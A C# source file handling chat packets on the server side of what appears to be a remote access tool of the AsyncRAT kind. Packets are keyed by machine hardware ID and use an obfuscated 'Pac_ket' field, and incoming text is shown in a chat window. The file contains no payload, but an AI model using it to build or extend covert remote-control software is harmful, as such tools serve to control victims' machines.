using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
    public class HandleChat
    {
        public void Read(MsgPack unpack_msgpack, Clients client)
        {
            try
            {
                var chat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                if (chat != null)
                {
                    Console.Beep();
                    chat.richTextBox1.SelectionColor = Color.Blue;
                    chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                    chat.richTextBox1.SelectionColor = Color.Black;
                    chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput2").AsString);
                    chat.richTextBox1.SelectionStart = chat.richTextBox1.TextLength;
                    chat.richTextBox1.ScrollToCaret();
                }
                else
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "chatExit";
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    client.Disconnected();
                }
            }
            catch
            {
            }
        }

        public void GetClient(MsgPack unpack_msgpack, Clients client)
        {
            var chat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            if (chat != null)
                if (chat.Client == null)
                {
                    chat.Client = client;
                    chat.textBox1.Enabled = true;
                    chat.timer1.Enabled = true;
                }
        }
    }
}